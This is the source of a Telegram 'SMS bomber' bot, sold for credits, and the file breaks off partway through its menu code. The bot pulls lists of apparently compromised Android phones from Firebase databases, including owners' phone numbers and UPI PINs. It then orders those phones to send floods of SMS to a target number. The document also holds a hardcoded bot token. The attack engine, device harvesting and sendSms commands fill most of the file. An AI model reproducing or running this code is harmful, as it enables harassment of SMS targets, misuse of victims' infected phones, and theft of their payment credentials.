#!/usr/bin/env python3
"""
DiMPiii BOMBZ - Premium Bomber Bot
Reply Keyboard Menu with Colors + Premium Emoji Icons
+ Referral System + Buy Points + Firebase from separate file
+ Small Caps Bold Font
+ Cancel Button in Wizard + Live Scan Summary + Firebase Name in Devices
+ ADMIN PANEL (Full Featured)
+ STARTUP RETRY + EXTENDED TIMEOUTS
+ FIX: 'int' object has no attribute 'get' in clients data
+ Referral 0.5 credit
+ STRICT credit fix (only user chosen credits deducted)
"""

import asyncio
import json
import logging
import sqlite3
import re
import sys
import functools
import random
import string
import os
import math
import time
from html import escape as html_escape
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    InputMediaPhoto,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

# ---------- CONFIG ----------
TOKEN = "8862789066:AAH26k1hadNbPr3iUYHZJ202C1R1MpQidmc"
ADMIN_IDS = [8732101004]
OWNER = "@nezuko_ff"
FIREBASE_FILE = "firebase_urls.json"

FORCE_CHANNELS = [
    "@dimpiii_modz",
    "@dimpiii_modz",
]

MAX_CONCURRENT_REQUESTS = 100

# ⭐ Referral reward = 0.5 credit
REFERRAL_REWARD = 0.5

# ⭐ 1 credit = 100 devices
DEVICES_PER_CREDIT = 100

# Default delay between SMS
DEFAULT_DELAY = 0.1

# ⭐ Progress update throttling
PROGRESS_UPDATE_EVERY = 5
PROGRESS_UPDATE_MIN_TIME = 3.0

POINT_PACKAGES = {
    "50": {"points": 50, "price": 200, "label": "50 ᴘᴏɪɴᴛs - ₹200"},
    "100": {"points": 100, "price": 350, "label": "100 ᴘᴏɪɴᴛs - ₹350"},
    "200": {"points": 200, "price": 500, "label": "200 ᴘᴏɪɴᴛs - ₹500"},
    "unlimited": {"points": -1, "price": 599, "label": "ᴜɴʟɪᴍɪᴛᴇᴅ 1 ᴍᴏɴᴛʜ - ₹599"},
}

if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("❌ ERROR: Bot token is not set.")
    sys.exit(1)

# ---------- LOGGING ----------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# ==================================================================
# ✨ PREMIUM CUSTOM EMOJI IDS ✨
# ==================================================================
E_STAR       = "5929169225045249724"
E_CHECKBOX   = "5927083283983635626"
E_MSG        = "5440411975509096877"
E_HEART_PURP = "5278694512510652957"
E_ARROW      = "6073540049574564713"
E_TICK       = "6217634016217013626"
E_CROWN      = "6073371536532706028"
E_HEART_BLUE = "6073149456658731161"
E_MEGA       = "6071236117447842411"
E_GLOBE      = "6188215208226329624"
E_SPARKLES   = "6188135613892399294"
E_LINK       = "5271604874419647061"
E_STATS      = "5231200819986047254"
E_USERS      = "5337080053119336309"
E_MEGAPHONE  = "5424818078833715060"
E_FILE       = "5305265301917549162"
E_BOLT       = "6188296945748938569"
E_LOCK       = "5296369303661067030"
E_PIN        = "5397782960512444700"
E_SEARCH     = "5231012545799666522"
E_GEAR       = "5341715473882955310"
E_SHIELD     = "5251203410396458957"
E_CROSS      = "5210952531676504517"
E_WARN       = "5447644880824181073"
E_REFRESH    = "5375338737028841420"
E_BOOKMARK   = "5222444124698853913"
E_MONEY      = "6188172065279840950"
E_GEM        = "6186113994261008960"
E_FIRE       = "6186121901295801546"
E_OK         = "6188206231744679914"
E_GIFT       = "6188172065279840950"


def tg(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


# ==================================================================
# 🔤 SMALL CAPS + BOLD FONT CONVERTER
# ==================================================================
SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ',
    'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ',
    'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ',
    'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ꜰ', 'G': 'ɢ',
    'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ',
    'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ',
    'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
}


def sc(text: str) -> str:
    converted = ''.join(SMALL_CAPS_MAP.get(ch, ch) for ch in text)
    return f"<b>{converted}</b>"


def scp(text: str) -> str:
    return ''.join(SMALL_CAPS_MAP.get(ch, ch) for ch in text)


T_STAR     = tg(E_STAR,       "⭐")
T_CHECKBOX = tg(E_CHECKBOX,   "☑️")
T_MSG      = tg(E_MSG,        "💬")
T_HEART_P  = tg(E_HEART_PURP, "💜")
T_ARROW    = tg(E_ARROW,      "➡️")
T_TICK     = tg(E_TICK,       "✔️")
T_CROWN    = tg(E_CROWN,      "👑")
T_HEART_B  = tg(E_HEART_BLUE, "💙")
T_MEGA     = tg(E_MEGA,       "📣")
T_SPARKLES = tg(E_SPARKLES,   "✨")
T_LINK     = tg(E_LINK,       "🔗")
T_STATS    = tg(E_STATS,      "📊")
T_USERS    = tg(E_USERS,      "👥")
T_MEGA2    = tg(E_MEGAPHONE,  "📢")
T_FILE     = tg(E_FILE,       "📄")
T_BOLT     = tg(E_BOLT,       "⚡")
T_LOCK     = tg(E_LOCK,       "🔒")
T_PIN      = tg(E_PIN,        "📌")
T_SEARCH   = tg(E_SEARCH,     "🔍")
T_GEAR     = tg(E_GEAR,       "⚙️")
T_SHIELD   = tg(E_SHIELD,     "🛡️")
T_CROSS    = tg(E_CROSS,      "❌")
T_WARN     = tg(E_WARN,       "⚠️")
T_REFRESH  = tg(E_REFRESH,    "🔄")
T_BOOKMARK = tg(E_BOOKMARK,   "🔖")
T_MONEY    = tg(E_MONEY,      "💰")
T_GEM      = tg(E_GEM,        "💎")
T_FIRE     = tg(E_FIRE,       "🔥")
T_OK       = tg(E_OK,         "✅")
T_GIFT     = tg(E_GIFT,       "🎁")

LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"
LINE_THIN = "─────────────────────"

# ==================================================================
# ASYNC HTTP CLIENT
# ==================================================================
_http_client = None
_http_semaphore = None


def get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(30.0, connect=15.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client


def get_http_semaphore() -> asyncio.Semaphore:
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore


async def check_channel_membership(user_id: int, bot) -> Tuple[bool, List[str]]:
    missing = []
    for channel in FORCE_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                missing.append(channel)
        except Exception:
            missing.append(channel)
    return (len(missing) == 0, missing)


def get_join_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for ch in FORCE_CHANNELS:
        buttons.append([
            InlineKeyboardButton(
                f"ᴊᴏɪɴ {ch}",
                url=f"https://t.me/{ch.lstrip('@')}",
                icon_custom_emoji_id=E_LINK,
            )
        ])
    buttons.append([
        InlineKeyboardButton("ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_join", icon_custom_emoji_id=E_TICK)
    ])
    return InlineKeyboardMarkup(buttons)


# ---------- FIREBASE FILE HELPERS ----------
def load_firebase_urls() -> List[Dict]:
    if not os.path.exists(FIREBASE_FILE):
        with open(FIREBASE_FILE, "w") as f:
            json.dump({"firebases": []}, f, indent=2)
        return []
    try:
        with open(FIREBASE_FILE, "r") as f:
            data = json.load(f)
        return data.get("firebases", [])
    except Exception as e:
        logger.error(f"Error loading firebase file: {e}")
        return []


def save_firebase_urls(firebases: List[Dict]):
    try:
        with open(FIREBASE_FILE, "w") as f:
            json.dump({"firebases": firebases}, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving firebase file: {e}")


# ---------- DATABASE ----------
DB_PATH = "bomber.db"


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    c.execute("""CREATE TABLE IF NOT EXISTS jobs (
        id TEXT PRIMARY KEY, target TEXT NOT NULL, message TEXT NOT NULL,
        devices_used INTEGER, success_count INTEGER, fail_count INTEGER,
        status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        scheduled_for TIMESTAMP, started_at TIMESTAMP, finished_at TIMESTAMP,
        firebase_ids TEXT, chat_id INTEGER, total_sms INTEGER, delay REAL,
        credit_used INTEGER, user_id INTEGER)""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, credits REAL DEFAULT 0,
        referred_by INTEGER, referral_code TEXT UNIQUE, joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        is_unlimited INTEGER DEFAULT 0, unlimited_expiry TIMESTAMP,
        is_banned INTEGER DEFAULT 0, ban_reason TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS keys (
        key_string TEXT PRIMARY KEY, credits INTEGER NOT NULL, max_uses INTEGER NOT NULL,
        used_count INTEGER DEFAULT 0, created_by INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS redemptions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key_string TEXT, user_id INTEGER,
        redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS referrals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER, referred_id INTEGER UNIQUE,
        points_awarded REAL DEFAULT 0.5, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS purchases (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, package_id TEXT,
        points INTEGER, price INTEGER, status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")

    c.execute("PRAGMA table_info(users)")
    columns = [row[1] for row in c.fetchall()]
    if "points" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0")
    if "referred_by" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER")
    if "referral_code" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN referral_code TEXT")
    if "is_unlimited" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN is_unlimited INTEGER DEFAULT 0")
    if "unlimited_expiry" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN unlimited_expiry TIMESTAMP")
    if "is_banned" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
    if "ban_reason" not in columns:
        c.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT")

    c.execute("PRAGMA table_info(jobs)")
    columns = [row[1] for row in c.fetchall()]
    if "total_sms" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN total_sms INTEGER")
    if "delay" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN delay REAL")
    if "credit_used" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN credit_used INTEGER")
    if "user_id" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN user_id INTEGER")

    conn.commit()
    conn.close()


init_db()


# ---------- DB HELPERS ----------
def db_add_job(job_id, target, message, firebase_ids, chat_id, total_sms, delay, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO jobs (id, target, message, status, firebase_ids, chat_id, total_sms, delay, user_id) VALUES (?,?,?,?,?,?,?,?,?)",
              (job_id, target, message, "pending", ",".join(firebase_ids), chat_id, total_sms, delay, user_id))
    conn.commit(); conn.close(); return job_id


def db_update_job(job_id, **kwargs):
    conn = _connect(); c = conn.cursor()
    fields, vals = [], []
    for k, v in kwargs.items():
        fields.append(f"{k}=?"); vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit(); conn.close()


def db_get_jobs(limit=20, user_id=None):
    conn = _connect(); conn.row_factory = sqlite3.Row; c = conn.cursor()
    if user_id is not None:
        c.execute("SELECT * FROM jobs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall(); conn.close()
    return [dict(row) for row in rows]


# ---------- USER / CREDITS ----------
def get_user(user_id):
    conn = _connect(); conn.row_factory = sqlite3.Row; c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    return dict(row) if row else None


def ensure_user(user_id, referred_by=None):
    user = get_user(user_id)
    if user:
        return user
    referral_code = f"REF{user_id}"
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO users (user_id, points, credits, referred_by, referral_code) VALUES (?,?,?,?,?)",
              (user_id, 0, 0, referred_by, referral_code))
    conn.commit(); conn.close()
    return get_user(user_id)


def is_banned(user_id):
    user = get_user(user_id)
    if not user:
        return False
    return bool(user.get("is_banned", 0))


def ban_user(user_id, reason=""):
    ensure_user(user_id)
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET is_banned=1, ban_reason=? WHERE user_id=?", (reason, user_id))
    conn.commit(); conn.close()


def unban_user(user_id):
    ensure_user(user_id)
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET is_banned=0, ban_reason=NULL WHERE user_id=?", (user_id,))
    conn.commit(); conn.close()


def get_user_points(user_id):
    user = ensure_user(user_id)
    return user["points"] if user else 0


def add_points(user_id, amount):
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET points = points + ? WHERE user_id=?", (amount, user_id))
    conn.commit(); conn.close()


def get_user_credits(user_id):
    user = ensure_user(user_id)
    if not user:
        return 0
    if user.get("is_unlimited"):
        expiry = user.get("unlimited_expiry")
        if expiry:
            try:
                if datetime.fromisoformat(expiry) > datetime.now():
                    return 999999
            except:
                pass
    return round(float(user["credits"] or 0), 2)


def update_user_credits(user_id, delta):
    ensure_user(user_id)
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = MAX(0, credits + ?) WHERE user_id=?", (delta, user_id))
    conn.commit(); conn.close()


def set_user_credits(user_id, amount):
    ensure_user(user_id)
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET credits = ? WHERE user_id=?", (amount, user_id))
    conn.commit(); conn.close()


def deduct_credits(user_id, amount):
    user = ensure_user(user_id)
    if not user:
        return False
    if user.get("is_unlimited"):
        expiry = user.get("unlimited_expiry")
        if expiry:
            try:
                if datetime.fromisoformat(expiry) > datetime.now():
                    return True
            except:
                pass
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    current = float(row[0] or 0) if row else 0
    if current >= amount:
        c.execute("UPDATE users SET credits = credits - ? WHERE user_id=?", (amount, user_id))
        conn.commit(); conn.close()
        return True
    conn.close()
    return False


# ⭐ REFERRAL — 0.5 CREDIT
def process_referral(referrer_id, new_user_id):
    try:
        referrer_id = int(referrer_id)
        new_user_id = int(new_user_id)
    except (ValueError, TypeError):
        logger.warning(f"Invalid referral IDs: {referrer_id}, {new_user_id}")
        return False

    if referrer_id == new_user_id:
        logger.warning(f"Self-referral blocked: {referrer_id}")
        return False

    ensure_user(referrer_id)
    conn = _connect(); c = conn.cursor()

    c.execute("SELECT 1 FROM referrals WHERE referred_id=?", (new_user_id,))
    if c.fetchone():
        conn.close()
        logger.info(f"User {new_user_id} already referred")
        return False

    c.execute("SELECT referred_by FROM users WHERE user_id=?", (new_user_id,))
    row = c.fetchone()
    if row and row[0]:
        conn.close()
        logger.info(f"User {new_user_id} already has referrer: {row[0]}")
        return False

    c.execute("UPDATE users SET referred_by=? WHERE user_id=?", (referrer_id, new_user_id))
    c.execute("INSERT INTO referrals (referrer_id, referred_id, points_awarded) VALUES (?,?,?)",
              (referrer_id, new_user_id, REFERRAL_REWARD))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (REFERRAL_REWARD, referrer_id))

    conn.commit(); conn.close()
    logger.info(f"✅ Referral: {referrer_id} earned {REFERRAL_REWARD} credit from {new_user_id}")
    return True


def get_referral_count(user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id=?", (user_id,))
    row = c.fetchone(); conn.close()
    return row[0] if row else 0


def get_all_user_ids():
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    rows = c.fetchall(); conn.close()
    return [r[0] for r in rows]


def get_banned_users():
    conn = _connect(); conn.row_factory = sqlite3.Row; c = conn.cursor()
    c.execute("SELECT user_id, ban_reason FROM users WHERE is_banned=1")
    rows = c.fetchall(); conn.close()
    return [dict(r) for r in rows]


# ---------- KEYS ----------
def generate_key_string(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def db_add_key(k, credits, max_uses, created_by):
    conn = _connect(); c = conn.cursor()
    c.execute("INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
              (k, credits, max_uses, created_by))
    conn.commit(); conn.close()


def db_redeem_key(key_string, user_id):
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT credits, max_uses, used_count FROM keys WHERE key_string=?", (key_string,))
    row = c.fetchone()
    if not row:
        conn.close(); return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close(); return False
    c.execute("SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?", (key_string, user_id))
    if c.fetchone():
        conn.close(); return False
    c.execute("UPDATE keys SET used_count = used_count + 1 WHERE key_string=?", (key_string,))
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
    if c.rowcount == 0:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, credits))
    c.execute("INSERT INTO redemptions (key_string, user_id) VALUES (?,?)", (key_string, user_id))
    conn.commit(); conn.close(); return True


# ---------- FIREBASE ----------
async def firebase_request(url, method="GET", payload=None, timeout=30):
    raw = url.rstrip("/"); query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"):
        raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    full_url = f"{raw}.json" if parsed.path else f"{raw}/.json"
    if query:
        full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET": resp = await client.get(full_url)
            elif method == "PUT": resp = await client.put(full_url, json=payload)
            elif method == "POST": resp = await client.post(full_url, json=payload)
            elif method == "DELETE": resp = await client.delete(full_url)
            else: raise ValueError("Unsupported")
            resp.raise_for_status()
            try: return resp.json()
            except json.JSONDecodeError: return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        status = e.response.status_code
        try: err_data = e.response.json() if e.response is not None else {}
        except: err_data = {"error": str(e)}
        return {"_error": True, "status": status, "message": err_data.get("error", str(e))}
    except httpx.ConnectError:
        return {"_error": True, "status": 0, "message": "Connection failed."}
    except httpx.TimeoutException:
        return {"_error": True, "status": 0, "message": "Request timed out."}
    except Exception as e:
        return {"_error": True, "status": 0, "message": str(e)}


async def get_online_devices(url):
    base = url.rstrip("/")
    if base.endswith(".json"):
        base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"

    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        logger.error(f"get_online_devices: {e}")
        return []

    if not isinstance(clients, dict):
        return []

    online = []
    for did, info in clients.items():
        if not isinstance(info, dict):
            continue
        status = info.get("status")
        is_online = (status is True) or (status == "true") or (status == 1)
        if not is_online:
            continue

        sims = info.get("sims", [])
        if not isinstance(sims, list):
            sims = []

        battery = info.get("battery", "N/A")
        if battery is None:
            battery = "N/A"
        elif isinstance(battery, (int, float)):
            battery = f"{battery}%"
        else:
            battery = str(battery)

        online.append({
            "id": did,
            "name": str(info.get("modelName", did)),
            "phone": str(info.get("mobNo", "N/A")),
            "battery": battery,
            "provider": str(info.get("service_provider", "")),
            "sims": sims,
            "upipin": str(info.get("upipin", "") or ""),
            "lastSeen": info.get("lastSeen"),
        })
    return online


async def send_sms_via_device(url, device_id, sim_index, target, message):
    payload = {"from": sim_index, "to": target, "message": message,
               "isSended": False, "timestamp": datetime.now().isoformat()}
    path = f"clients/{device_id}/webhookEvent/sendSms"
    put_url = f"{url.rstrip('/')}/{path}.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Send failed {device_id}: {e}")
        return False


# ---------- GLOBALS ----------
running_jobs = {}
progress_messages = {}
last_progress_time = {}
BOT = None


def set_bot(bot):
    global BOT
    BOT = bot


# ==================================================================
# BOMB ENGINE — ⭐ STRICT CREDIT FIX
# ==================================================================
async def execute_bomb_job(job_id, target, message, firebase_ids, total_sms, delay, user_id):
    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())

    all_devices = []
    firebases_list = load_firebase_urls()
    firebase_map = {fb["id"]: fb for fb in firebases_list}

    # ⭐ CREDIT FIX: Limit devices to job's total_sms (= credits × 100)
    max_devices = total_sms

    for fid in [f for f in firebase_ids if f in firebase_map]:
        if len(all_devices) >= max_devices:
            break
        url = firebase_map[fid]["url"]
        devices = await get_online_devices(url)
        for dev in devices:
            if len(all_devices) >= max_devices:
                break
            all_devices.append((fid, dev, url))

    # ⭐ STRICT TRIM
    if len(all_devices) > max_devices:
        all_devices = all_devices[:max_devices]

    if not all_devices:
        db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0,
                                    finished=True, error="No online devices", force=True)
        return

    num_devices = len(all_devices)

    # ⭐ CREDIT FIX: Credits = exactly from total_sms (not from num_devices)
    credits_needed = math.ceil(total_sms / DEVICES_PER_CREDIT)

    user = get_user(user_id)
    is_unlimited = False
    if user and user.get("is_unlimited"):
        expiry = user.get("unlimited_expiry")
        if expiry:
            try:
                if datetime.fromisoformat(expiry) > datetime.now():
                    is_unlimited = True
            except:
                pass

    if not is_unlimited:
        if not deduct_credits(user_id, credits_needed):
            db_update_job(job_id, status="failed", finished_at=datetime.now().isoformat(),
                          devices_used=0, success_count=0, fail_count=0, credit_used=0)
            await send_progress_update(job_id, 0, total=num_devices, success=0, fail=0,
                                        finished=True, error=f"Insufficient credits. Need {credits_needed}",
                                        force=True)
            return
    else:
        credits_needed = 0

    total_attempts = num_devices
    success = 0
    fail = 0

    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0,
                                credit_used=credits_needed, devices_total=num_devices,
                                devices_done=0, force=True)

    for idx, (fid, dev, url) in enumerate(all_devices, start=1):
        sims = dev.get("sims", [])
        sim_index = 1 if sims else 1
        ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
        if ok:
            success += 1
        else:
            fail += 1

        if idx % PROGRESS_UPDATE_EVERY == 0 or idx == total_attempts:
            await send_progress_update(job_id, idx, total=total_attempts, success=success, fail=fail,
                                        credit_used=credits_needed, devices_total=num_devices,
                                        devices_done=idx)
        await asyncio.sleep(delay)

    db_update_job(job_id, status="completed", finished_at=datetime.now().isoformat(),
                  devices_used=num_devices, success_count=success, fail_count=fail,
                  credit_used=credits_needed)
    await send_progress_update(job_id, total_attempts, total=total_attempts, success=success, fail=fail,
                               finished=True, credit_used=credits_needed,
                               devices_total=num_devices, devices_done=num_devices, force=True)
    running_jobs.pop(job_id, None); progress_messages.pop(job_id, None)
    last_progress_time.pop(job_id, None)


async def send_progress_update(job_id, done, total, success, fail, finished=False, error=None,
                                credit_used=0, devices_total=0, devices_done=0, force=False):
    if BOT is None: return

    now = time.time()
    last = last_progress_time.get(job_id, 0)
    if not force and not finished and not error:
        if (now - last) < PROGRESS_UPDATE_MIN_TIME:
            return
    last_progress_time[job_id] = now

    conn = _connect(); c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id, message FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone(); conn.close()
    if not row: return
    chat_id, target, user_id, user_message = row
    credits = get_user_credits(user_id) if user_id else 0

    remaining = max(0, total - done)
    percent = 0 if total == 0 else int((done / total) * 100)
    bar_length = 20
    filled = int(bar_length * percent / 100)
    bar = "▰" * filled + "▱" * (bar_length - filled)

    if error:
        status_text = f"{T_CROSS} <b>{scp('Failed')}</b>"
        header = f"{T_CROSS} <b>{scp('BOMB FAILED')}</b> {T_CROSS}"
    elif finished:
        status_text = f"{T_TICK} <b>{scp('Completed')}</b>"
        header = f"{T_TICK} <b>{scp('BOMB COMPLETED')}</b> {T_TICK}"
    else:
        status_text = f"{T_REFRESH} <b>{scp('Sending...')}</b>"
        header = f"{T_FIRE} <b>{scp('BOMBING IN PROGRESS')}</b> {T_FIRE}"

    # ⭐ HTML escape user input
    safe_message = html_escape(str(user_message))
    safe_target = html_escape(str(target))

    text = (
        f"╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {header}\n"
        f"╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_PIN} <b>{scp('Number')}:</b> <code>{safe_target}</code>\n"
        f"{T_MSG} <b>{scp('Message')}:</b> {safe_message}\n"
        f"{LINE}\n"
        f"<code>{bar}</code>\n"
        f"         <b>{percent}%</b>\n"
        f"{LINE}\n\n"
        f"{T_TICK} <b>{scp('Sent')}:</b> {success}\n"
        f"{T_CROSS} <b>{scp('Failed')}:</b> {fail}\n"
        f"{T_BOLT} <b>{scp('Remaining')}:</b> {remaining}\n"
        f"{T_STATS} <b>{scp('Total')}:</b> {total}\n"
        f"{LINE}\n"
        f"{T_MONEY} <b>{scp('Credits Used')}:</b> {credit_used}\n"
        f"{T_HEART_P} <b>{scp('Credits Left')}:</b> {credits}\n"
        f"{T_SPARKLES} <b>{scp('Status')}:</b> {status_text}"
    )
    if error:
        text += f"\n{T_WARN} <b>{scp('Error')}:</b> {html_escape(str(error))}"

    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(text, chat_id=chat_id,
                message_id=progress_messages[job_id], parse_mode=ParseMode.HTML)
        except Exception as e:
            err_str = str(e).lower()
            if "flood" in err_str or "retry" in err_str:
                pass
            else:
                logger.warning(f"edit progress: {e}")
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.HTML)
            progress_messages[job_id] = msg.message_id
        except Exception as e:
            logger.warning(f"send progress: {e}")


# ==================================================================
# 🎯 REPLY KEYBOARD MAIN MENU
# ==================================================================
(TARGET, MESSAGE, CREDITS) = range(3)


BTN_LAUNCH_BOMB = "ʟᴀᴜɴᴄʜ ʙᴏᴍʙ"
BTN_BALANCE     = "ʙᴀʟᴀɴᴄᴇ"
BTN_STATUS      = "sᴛᴀᴛᴜs"
BTN_HISTORY     = "ʜɪsᴛᴏʀʏ"
BTN_REDEEM_KEY  = "ʀᴇᴅᴇᴇᴍ ᴋᴇʏ"
BTN_ONLINE_DEV  = "ᴏɴʟɪɴᴇ ᴅᴇᴠɪᴄᴇs"
BTN_STATS_HIST  = "sᴛᴀᴛs & ʜɪsᴛᴏʀʏ"
BTN_MANAGE_FB   = "ᴍᴀɴᴀɢᴇ ꜰɪʀᴇʙᴀsᴇs"
BTN_GEN_KEY     = "ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ"
BTN_REFERRAL    = "ʀᴇꜰᴇʀʀᴀʟ"
BTN_BUY_POINTS  = "ʙᴜʏ ᴘᴏɪɴᴛs"
BTN_CANCEL      = "ᴄᴀɴᴄᴇʟ"
BTN_ADMIN_PANEL = "ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"


def get_cancel_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [[KeyboardButton(BTN_CANCEL, style='danger', icon_custom_emoji_id=E_CROSS)]],
        resize_keyboard=True, is_persistent=True,
    )


def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    if user_id in ADMIN_IDS:
